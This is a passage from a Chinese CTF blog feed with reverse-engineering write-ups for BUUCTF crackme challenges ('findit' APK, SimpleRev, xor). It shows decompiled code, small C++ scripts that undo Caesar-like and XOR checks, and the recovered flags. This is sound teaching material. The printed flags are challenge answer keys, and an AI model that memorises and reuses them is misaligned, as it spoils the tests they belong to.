很可能和<strong>flag</strong>有关</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231616264.png"
alt="image-20220123161621158" />
<figcaption aria-hidden="true">image-20220123161621158</figcaption>
</figure>
<p><code>smali</code>格式阅读起来很不方便,
需要将它还原成<code>Java</code>代码,
但是<code>AndroidKiller</code>不支持这种功能,
所以改用<code>jadx</code>.</p>
<blockquote>
<p>jadx: <a href="https://github.com/skylot/jadx">Github</a></p>
</blockquote>
<p>用<code>jadx-gui</code>直接打开<code>apk</code>, 源码就出来了,
到<code>MainActivity</code>一看, 果然和<strong>flag</strong>有关</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201231633521.png"
alt="image-20220123163357380" />
<figcaption aria-hidden="true">image-20220123163357380</figcaption>
</figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.findit;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.support.v7.app.ActionBarActivity;</span><br><span class="line"><span class="keyword">import</span> android.view.MenuItem;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"><span class="keyword">import</span> android.widget.EditText;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">ActionBarActivity</span> &#123;</span><br><span class="line">    <span class="comment">/* access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// android.support.v7.app.ActionBarActivity, android.support.v4.app.FragmentActivity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">edit</span> <span class="operator">=</span> (EditText) findViewById(R.id.widget2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TextView</span> <span class="variable">text</span> <span class="operator">=</span> (TextView) findViewById(R.id.widget1);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">char</span>[] a = &#123;<span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span>&#125;;</span><br><span class="line">        <span class="keyword">final</span> <span class="type">char</span>[] b = &#123;<span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>&#125;;</span><br><span class="line">        ((Button) findViewById(R.id.widget3)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="comment">/* class com.example.findit.MainActivity.AnonymousClass1 */</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="type">char</span>[] x = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">17</span>];</span><br><span class="line">                <span class="type">char</span>[] y = <span class="keyword">new</span> <span class="title class_">char</span>[<span class="number">38</span>];</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;I&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;A&#x27;</span>) || (a[i] &lt; <span class="string">&#x27;i&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;a&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = (<span class="type">char</span>) (a[i] + <span class="number">18</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;A&#x27;</span> || a[i] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (a[i] &lt; <span class="string">&#x27;a&#x27;</span> || a[i] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                        x[i] = a[i];</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        x[i] = (<span class="type">char</span>) (a[i] - <span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (String.valueOf(x).equals(edit.getText().toString())) &#123;</span><br><span class="line">                    <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; <span class="number">38</span>; i2++) &#123;</span><br><span class="line">                        <span class="keyword">if</span> ((b[i2] &lt; <span class="string">&#x27;A&#x27;</span> || b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> || b[i2] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">                            y[i2] = b[i2];</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            y[i2] = (<span class="type">char</span>) (b[i2] + <span class="number">16</span>);</span><br><span class="line">                            <span class="keyword">if</span> ((y[i2] &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">                                y[i2] = (<span class="type">char</span>) (y[i2] - <span class="number">26</span>);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    text.setText(String.valueOf(y));</span><br><span class="line">                    <span class="keyword">return</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                text.setText(<span class="string">&quot;答案错了肿么办。。。不给你又不好意思。。。哎呀好纠结啊~~~&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">onOptionsItemSelected</span><span class="params">(MenuItem item)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (item.getItemId() == R.id.action_settings) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.onOptionsItemSelected(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>好在<code>Java</code>的语法和<code>C/C++</code>类似,
可以大概看出来是个啥意思:</p>
<p>先对<code>a</code>数组进行处理, 放到<code>x</code>数组中,
对比用户的输入和<code>x</code>数组是否相同,
若相同则对<code>b</code>数组进行处理放到<code>y</code>数组中并显示出来,
想必<code>y</code>数组中的就是<strong>flag</strong>.</p>
<p>解密代码如下:</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> a[] = &#123; <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;e&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> b[] = &#123; <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> x[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="type">unsigned</span> <span class="type">char</span> y[<span class="number">64</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;I&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;A&#x27;</span>) || (a[i] &lt; <span class="string">&#x27;i&#x27;</span> &amp;&amp; a[i] &gt;= <span class="string">&#x27;a&#x27;</span>)) &#123;</span><br><span class="line">			x[i] = (a[i] + <span class="number">18</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> ((a[i] &lt; <span class="string">&#x27;A&#x27;</span> || a[i] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (a[i] &lt; <span class="string">&#x27;a&#x27;</span> || a[i] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">			x[i] = a[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			x[i] = (a[i] - <span class="string">&#x27;\b&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i2 = <span class="number">0</span>; i2 &lt; <span class="number">38</span>; i2++) &#123;</span><br><span class="line">		<span class="keyword">if</span> ((b[i2] &lt; <span class="string">&#x27;A&#x27;</span> || b[i2] &gt; <span class="string">&#x27;Z&#x27;</span>) &amp;&amp; (b[i2] &lt; <span class="string">&#x27;a&#x27;</span> || b[i2] &gt; <span class="string">&#x27;z&#x27;</span>)) &#123;</span><br><span class="line">			y[i2] = b[i2];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			y[i2] = (b[i2] + <span class="number">16</span>);</span><br><span class="line">			<span class="keyword">if</span> ((y[i2] &gt; <span class="string">&#x27;Z&#x27;</span> &amp;&amp; y[i2] &lt; <span class="string">&#x27;a&#x27;</span>) || y[i2] &gt;= <span class="string">&#x27;z&#x27;</span>) &#123;</span><br><span class="line">				y[i2] = (y[i2] - <span class="number">26</span>);</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Key:%s\nFlag:%s&quot;</span>, x, y);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//Key:LzakAkLzwXdsyZgew</span></span><br><span class="line"><span class="comment">//Flag:flag&#123;c164675262033b4c49bdf7f9cda28a75&#125;</span></span><br><span class="line"><span class="comment">//用unsigned char是因为实测用char的话, 这个flag的算法在C/C++里会出现溢出而出现乱码, </span></span><br><span class="line"><span class="comment">//查了一下是因为Java的char是2字节. 这个flag的算法其实就是位移+16位类凯撒加密</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>逆向</tag>
        <tag>Java逆向</tag>
        <tag>Android逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]SimpleRev</title>
    <url>/2022/01/22/%5BReverse%5DSimpleRev/</url>
    <content><![CDATA[<p>不是PE文件, 直接拖进<code>IDA</code>分析, F5查看伪代码</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201221410232.png"
alt="image-20220122141058186" />
<figcaption aria-hidden="true">image-20220122141058186</figcaption>
</figure>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [rsp+Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: &quot;</span>);</span><br><span class="line">      v4 = getchar();</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">100</span> &amp;&amp; v4 != <span class="number">68</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Decry();	<span class="comment">//重点就在这个函数里面</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">113</span> || v4 == <span class="number">81</span> )</span><br><span class="line">      Exit(<span class="string">&quot;Welcome to CTF game!\nPlease input d/D to start or input q/Q to quit this program: &quot;</span>, argv);		<span class="comment">//退出函数这里为啥要传参进去?不是很懂</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Input fault format!&quot;</span>);</span><br><span class="line">    v3 = getchar();</span><br><span class="line">    <span class="built_in">putchar</span>(v3);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Decry()</code>函数长这样</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">Decry</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1; <span class="comment">// [rsp+Fh] [rbp-51h]</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+14h] [rbp-4Ch]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [rsp+1Ch] [rbp-44h]</span></span><br><span class="line">  <span class="type">char</span> src[<span class="number">8</span>]; <span class="comment">// [rsp+20h] [rbp-40h] BYREF</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+28h] [rbp-38h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+30h] [rbp-30h]</span></span><br><span class="line">  __int64 v9[<span class="number">2</span>]; <span class="comment">// [rsp+40h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// [rsp+50h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v11; <span class="comment">// [rsp+58h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="comment">/*__readfsqword()函数从FS:[Offset]读取4字长的内容,同理还有__readfsbyte()等函数, 此处作用未知*/</span></span><br><span class="line">  *(_QWORD *)src = <span class="number">0x534C43444E</span>LL;</span><br><span class="line">  v7 = <span class="number">0LL</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v9[<span class="number">0</span>] = <span class="number">0x776F646168</span>LL;</span><br><span class="line">  v9[<span class="number">1</span>] = <span class="number">0LL</span>;</span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  text = (<span class="type">char</span> *)join(key3, v9);	<span class="comment">//自定义的字符拼接,text=&quot;killshadow&quot;</span></span><br><span class="line">  <span class="built_in">strcpy</span>(key, key1);</span><br><span class="line">  <span class="built_in">strcat</span>(key, src);		<span class="comment">//key=&quot;ADSFKNDCLS&quot;</span></span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  getchar();</span><br><span class="line">  v5 = <span class="built_in">strlen</span>(key);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v5; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( key[v3 % v5] &gt; <span class="number">64</span> &amp;&amp; key[v3 % v5] &lt;= <span class="number">90</span> )</span><br><span class="line">      key[i] = key[v3 % v5] + <span class="number">32</span>;	<span class="comment">//将key中每个字符由大写转成小写</span></span><br><span class="line">    ++v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Please input your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">          ++v3;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">        ++v3;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(text, str2) )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Congratulation!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try again!\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v11;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主要就是逆向这一段, 得出v1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = getchar();</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">10</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">32</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v1 &lt;= <span class="number">96</span> || v1 &gt; <span class="number">122</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( v1 &gt; <span class="number">64</span> &amp;&amp; v1 &lt;= <span class="number">90</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">          ++v3;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str2[v2] = (v1 - <span class="number">39</span> - key[v3 % v5] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">        ++v3;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !(v3 % v5) )</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">32</span>);</span><br><span class="line">      ++v2;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>写出解密脚本</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> key[<span class="number">16</span>] = <span class="string">&quot;adsfkndcls&quot;</span>;</span><br><span class="line">    <span class="type">char</span> ciphertext[<span class="number">16</span>] = <span class="string">&quot;killshadow&quot;</span>;</span><br><span class="line">    <span class="type">char</span> plaintext[<span class="number">16</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> key_offset = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(ciphertext); i++)</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c = <span class="number">32</span>; c &lt; <span class="number">127</span>; c++) <span class="comment">//穷举所有可打印ASCII字符</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">char</span> temp = c;</span><br><span class="line">            <span class="keyword">if</span> ((<span class="string">&#x27;a&#x27;</span> &lt;= c &amp;&amp; c &lt;= <span class="string">&#x27;z&#x27;</span>) <span class="built_in">or</span> (<span class="string">&#x27;A&#x27;</span> &lt;= c &amp;&amp; c &lt;= <span class="string">&#x27;Z&#x27;</span>))</span><br><span class="line">                temp = (c - <span class="number">39</span> - key[key_offset % <span class="built_in">strlen</span>(key)] + <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span>;</span><br><span class="line">            <span class="keyword">if</span> (temp == ciphertext[i])</span><br><span class="line">            &#123;</span><br><span class="line">                plaintext[i] = c;</span><br><span class="line">                key_offset++;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, plaintext);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//KLDQCUDFZO</span></span><br></pre></td></tr></table></figure>
<p>所以<strong>flag</strong>就是<code>flag&#123;KLDQCUDFZO&#125;</code></p>
]]></content>
      <categories>
        <category>Reverse</category>
      </categories>
      <tags>
        <tag>二进制</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>[BUUCTF]xor</title>
    <url>/2022/01/21/%5BReverse%5Dxor/</url>
    <content><![CDATA[<p>下载下来发现文件不是exe, 先<code>IDA</code>看一下, 发现不是PE文件</p>
<figure>
<img
src="https://raw.githubusercontent.com/x2658y/static/master/images/202201212026864.png"
alt="image-20220121202632787" />
<figcaption aria-hidden="true">image-20220121202632787</figcaption>
</figure>
<p>直接分析F5看伪代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-124h]</span></span><br><span class="line">  <span class="type">char</span> __b[<span class="number">264</span>]; <span class="comment">// [rsp+40h] [rbp-110h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(__b, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Input your flag:\n&quot;</span>);</span><br><span class="line">  get_line(__b, <span class="number">256LL</span>);                 <span class="comment">//将输入的字符串保存到__b数组中</span></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(__b) != <span class="number">33</span> )              <span class="comment">//输入的字符串必须长33字节(不含尾部&#x27;\0&#x27;)</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_7;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt; <span class="number">33</span>; ++i )			</span><br><span class="line">    __b[i] ^= __b[i - <span class="number">1</span>];               <span class="comment">//输入字符串的每后一位与前一位的异或</span></span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strncmp</span>(__b, global, <span class="number">0x21</span>uLL) ) <span class="comment">//将异或后的结果与global这个字符串相比较</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">LABEL_7:</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Failed&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这这题需要用到一个知识点, 异或(XOR)两次会还原</p>
